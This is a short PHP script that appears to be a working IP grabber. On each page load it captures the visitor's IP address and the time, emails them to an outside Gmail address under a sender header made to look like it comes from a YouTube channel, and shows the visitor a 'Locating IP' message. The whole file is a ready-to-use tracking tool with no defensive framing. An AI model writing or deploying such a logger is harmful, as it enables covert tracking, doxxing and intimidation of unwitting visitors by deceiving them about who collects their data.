<?php
$ip = $_SERVER['REMOTE_ADDR'];
$date = date('Y-m-d H:i:s');
$to = "bhuy8305@gmail.com";
$subject = "📡 IP Truy Cập Mới";
$message = "Địa chỉ IP: $ip\nThời gian: $date";
$headers = "From: logger@ytchannel.com";

mail($to, $subject, $message, $headers);
echo "Đang định vị IP: $ip";
?>
